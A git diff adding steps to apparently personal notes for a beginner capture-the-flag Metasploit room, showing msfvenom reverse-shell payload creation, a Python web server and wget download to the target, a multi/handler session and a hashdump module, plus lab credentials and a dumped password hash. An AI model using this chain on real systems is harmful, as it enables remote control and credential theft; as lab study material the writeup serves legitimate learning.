@@ -148,7 +148,32 @@ These are my notes, answers, and writeups for all the rooms in the Complete Begi
   > 8ce9a3ebd1647fcc5e04025019f4b875
 #### Task 6
 - Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type "sudo su" to get a root shell, this will make things easier.
-```
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<port> -f elf > rev_shell.elf
-```
-
+  ```
+  ssh murphy@<target_ip> 
+  ```
+- Create a meterpreter payload in the .elf format (on the AttackBox, or your attacking machine of choice).
+  ```
+  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<port> -f elf > rev_shell.elf
+  ```
+- Transfer it to the target machine (you can start a Python web server on your attacking machine with the python3 -m http.server 9000 command and use wget http://ATTACKING_10.10.190.253:9000/shell.elf to download it to the target machine).
+  ```
+  attack: python3 -m http.server
+  target: wget http://<attack_ip>:8000/rev_shell.elf
+  ```
+- Get a meterpreter session on the target machine.
+  ```
+  attack: use exploit/multi/handler
+          set payload linux/x86/meterpreter/reverse_tcp
+          set lhost <attack_ip>
+          set lport <port>
+          run
+  target: ./rev_shell.elf
+  ```
+- Use a post exploitation module to dump hashes of other users on the system.
+  ```
+  background
+  use post/linux/gather/hashdump
+  set session <#>
+  run
+  ```
+  > $6$qK0Kt4UO$HuCrlOJGbBJb5Av9SL7rEzbxcz/KZYFkMwUqAE0ZMDpNRmOHhPHeI2JU3m9OBOS7lUKkKMADLxCBcywzIxl7b.
